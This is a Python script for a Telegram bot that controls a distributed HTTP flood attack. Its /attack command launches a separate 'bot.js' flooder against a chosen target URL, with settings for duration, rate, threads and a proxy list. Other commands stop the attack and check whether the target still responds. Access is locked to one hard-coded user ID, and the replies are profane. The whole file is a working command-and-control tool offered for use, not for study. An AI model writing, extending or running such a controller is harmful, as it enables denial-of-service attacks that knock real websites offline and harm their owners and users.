import subprocess
import os
import signal
import telebot

bot_process = None
BOT_SCRIPT = "bot.js"
TARGET_URL = None
TELEGRAM_BOT_TOKEN = ""
ALLOWED_USER_ID = 6722885929

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

def start_bot(target, time, ratelimit, threads, proxyfile):
    global bot_process, TARGET_URL
    TARGET_URL = target
    if bot_process is None or bot_process.poll() is None:
        bot_process = subprocess.Popen(['node', BOT_SCRIPT, target, str(time), str(ratelimit), str(threads), proxyfile])
        return True
    return False

def kill_bot():
    global bot_process
    if bot_process and bot_process.poll() is None:
        os.kill(bot_process.pid, signal.SIGTERM)
        bot_process.wait()
        bot_process = None
        return True
    return False

def kill_subprocesses():
    try:
        current_pid = os.getpid()
        pids = subprocess.check_output(f'pgrep -P {current_pid}', shell=True).decode().split()
        for pid in pids:
            os.kill(int(pid), signal.SIGTERM)
    except:
        pass

@bot.message_handler(commands=['attack'])
def attack_command(message):
    if message.from_user.id != ALLOWED_USER_ID:
        bot.reply_to(message, "Fuck off, you’re not authorized.")
        return
    args = message.text.split()[1:]
    if len(args) < 5:
        bot.reply_to(message, "Usage: /attack <target> <time> <ratelimit> <threads> <proxyfile>\nExample: /attack http://victim.com 120 512 258 proxy.txt")
        return
    target, time, ratelimit, threads, proxyfile = args[:5]
    if not os.path.exists(proxyfile):
        bot.reply_to(message, f"Proxy file {proxyfile} doesn’t fucking exist.")
        return
    if start_bot(target, time, ratelimit, threads, proxyfile):
        bot.reply_to(message, f"Attack started, fucking up {target} for {time}s with {ratelimit} rate, {threads} threads, proxies from {proxyfile}. 🖕")
    else:
        bot.reply_to(message, "Bot’s already running, you impatient fuck.")

@bot.message_handler(commands=['nuke'])
def nuke_command(message):
    if message.from_user.id != ALLOWED_USER_ID:
        bot.reply_to(message, "Fuck off, you’re not authorized.")
        return
    if kill_bot():
        bot.reply_to(message, "Bot nuked, chill the fuck out.")
    else:
        bot.reply_to(message, "No bot running, you high?")

@bot.message_handler(commands=['http'])
def http_command(message):
    if message.from_user.id != ALLOWED_USER_ID:
        bot.reply_to(message, "Fuck off, you’re not authorized.")
        return
    if not TARGET_URL:
        bot.reply_to(message, "No target set, dumbass.")
        return
    try:
        result = subprocess.check_output(['node', BOT_SCRIPT, TARGET_URL, '1', '1', '1', 'proxy.txt', '--status'], text=True)
        bot.reply_to(message, f"HTTP Status: {result.strip()}")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"Status check fucked up: {e.output.strip()}")

@bot.message_handler(commands=['status'])
def status_command(message):
    if message.from_user.id != ALLOWED_USER_ID:
        bot.reply_to(message, "Fuck off, you’re not authorized.")
        return
    status = "Running" if bot_process and bot_process.poll() is None else "Stopped"
    bot.reply_to(message, f"Bot Status: {status}\nTarget: {TARGET_URL or 'None'}")

@bot.message_handler(commands=['kill'])
def kill_command(message):
    if message.from_user.id != ALLOWED_USER_ID:
        bot.reply_to(message, "Fuck off, you’re not authorized.")
        return
    kill_subprocesses()
    bot.reply_to(message, "Everything’s fucking dead. 💀")

bot.polling()
